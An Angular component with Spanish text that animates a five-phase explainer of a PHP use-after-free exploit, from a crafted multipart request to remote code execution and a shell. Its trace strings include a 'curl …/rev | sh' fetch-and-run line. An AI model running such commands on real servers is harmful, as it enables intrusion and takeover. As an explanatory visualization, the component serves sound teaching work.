import { Component, DestroyRef, inject, signal } from '@angular/core';
import { RevealDirective } from '../../shared/reveal.directive';

/** Una fase del recorrido del exploit. */
interface AttackPhase {
  icon: string;
  label: string;
  detail: string;
  body: string;
  trace: string;
  chipLabel: string;
  chipKind: string;
}

/**
 * «Flujo del ataque»: recorrido animado del exploit en cinco fases con
 * reproducción automática, pausa y avance manual.
 */
@Component({
  selector: 'app-attack-flow',
  imports: [RevealDirective],
  template: `
    <div class="af" appReveal>
      <div class="af-head">
        <h3 class="af-title">El flujo del ataque, fase a fase</h3>
        <div class="af-controls">
          <button type="button" class="af-btn" (click)="prev()" [disabled]="step() === 0" aria-label="Fase anterior">◀</button>
          <button type="button" class="af-btn af-btn-main" (click)="toggle()" [attr.aria-label]="playing() ? 'Pausar' : 'Reproducir'">
            {{ playing() ? '◫ Pausar' : '▷ Reproducir' }}
          </button>
          <button type="button" class="af-btn" (click)="next()" [disabled]="step() === phases.length - 1" aria-label="Fase siguiente">▶</button>
          <button type="button" class="af-btn" (click)="restart()" aria-label="Reiniciar">↺</button>
          <span class="af-count">fase {{ pad(step() + 1) }} / {{ pad(phases.length) }}</span>
        </div>
      </div>

      <div class="af-track-wrap">
        <div class="af-line" aria-hidden="true"></div>
        <div class="af-packet" aria-hidden="true" [style.left.%]="packetLeft()"></div>
        <ol class="af-track">
          @for (p of phases; track p.label; let i = $index) {
            <li>
              <button
                type="button"
                class="af-node"
                [class.active]="i === step()"
                [class.done]="i < step()"
                [attr.aria-current]="i === step() ? 'step' : null"
                (click)="goTo(i)"
              >
                <span class="af-node-icon">{{ p.icon }}</span>
                <span class="af-node-label">{{ p.label }}</span>
              </button>
            </li>
          }
        </ol>
      </div>

      <div class="af-detail" aria-live="polite">
        <div class="af-detail-head">
          <span class="af-detail-icon">{{ phases[step()].icon }}</span>
          <strong class="af-detail-label">{{ phases[step()].label }}</strong>
          <span class="chip" [class]="'chip chip-' + phases[step()].chipKind">
            <span class="dot"></span>{{ phases[step()].chipLabel }}
          </span>
        </div>
        <p class="af-detail-body">{{ phases[step()].body }}</p>
        <code class="af-trace">{{ phases[step()].trace }}</code>
      </div>
    </div>
  `,
  styleUrl: './attack-flow.css',
})
export class AttackFlow {
  private readonly destroyRef = inject(DestroyRef);
  private timer: ReturnType<typeof setInterval> | undefined;

  protected readonly step = signal(0);
  protected readonly playing = signal(false);

  protected readonly phases: AttackPhase[] = [
    {
      icon: '01',
      label: 'Petición manipulada',
      detail: 'HTTP multipart diseñada',
      body:
        'Cualquier visitante envía una petición multipart con campos calculados: no hay sesión, ' +
        'token ni login que lo detenga.',
      trace: 'POST /index.php · multipart/form-data; boundary=----x',
      chipLabel: '⊘ Sin autenticación',
      chipKind: 'danger',
    },
    {
      icon: '02',
      label: 'Estado corrupto',
      detail: 'memoria a medio liberar',
      body:
        'Los campos de la petición fuerzan un error de memoria (OOM) y dejan el heap del worker ' +
        'PHP a medio escribir — o sueltan un puntero que ya no debería existir.',
      trace: 'zend_mm: heap corruption · Allowed memory size exhausted',
      chipLabel: '⚠ CVE-2026-109618',
      chipKind: 'warn',
    },
    {
      icon: '03',
      label: 'use-after-free',
      detail: 'el motor lo reutiliza',
      body:
        'El motor reutiliza ese estado obsoleto: aquí entra session.upload_progress, el vector ' +
        'favorito del incidente, junto al estado global a medio limpiar.',
      trace: 'session.upload_progress · estado global obsoleto (∞)',
      chipLabel: '∞ use-after-free',
      chipKind: 'warn',
    },
    {
      icon: '04',
      label: 'Código arbitrario',
      detail: 'comandos del atacante',
      body:
        'Con la memoria bajo control, el atacante ejecuta lo que quiera con los permisos del ' +
        'usuario del servidor web, normalmente www-data.',
      trace: 'system("id") → uid=33(www-data) gid=33(www-data)',
      chipLabel: '☠ RCE',
      chipKind: 'danger',
    },
    {
      icon: '05',
      label: 'Shell remota',
      detail: 'control del servidor',
      body:
        'La shell queda operativa: comandos, webshells, robo de .env, rebote a Laravel o a lo que ' +
        'haya detrás. A partir de aquí, el límite lo pone el atacante.',
      trace: 'www-data@servidor:~$ curl http://…/rev | sh',
      chipLabel: '☠ Shell remota',
      chipKind: 'danger',
    },
  ];

  protected packetLeft(): number {
    return (this.step() * 100) / (this.phases.length - 1);
  }

  protected pad(n: number): string {
    return String(n).padStart(2, '0');
  }

  protected toggle(): void {
    if (this.playing()) {
      this.pause();
    } else {
      this.play();
    }
  }

  protected play(): void {
    if (this.step() === this.phases.length - 1) {
      this.step.set(0);
    }
    this.playing.set(true);
    this.clear();
    this.timer = setInterval(() => {
      if (this.step() >= this.phases.length - 1) {
        this.pause();
        return;
      }
      this.step.update((s) => s + 1);
    }, 2600);
    this.destroyRef.onDestroy(() => this.clear());
  }

  protected pause(): void {
    this.playing.set(false);
    this.clear();
  }

  protected restart(): void {
    this.pause();
    this.step.set(0);
  }

  protected next(): void {
    this.pause();
    this.step.update((s) => Math.min(s + 1, this.phases.length - 1));
  }

  protected prev(): void {
    this.pause();
    this.step.update((s) => Math.max(s - 1, 0));
  }

  protected goTo(i: number): void {
    this.pause();
    this.step.set(i);
  }

  private clear(): void {
    if (this.timer !== undefined) {
      clearInterval(this.timer);
      this.timer = undefined;
    }
  }
}
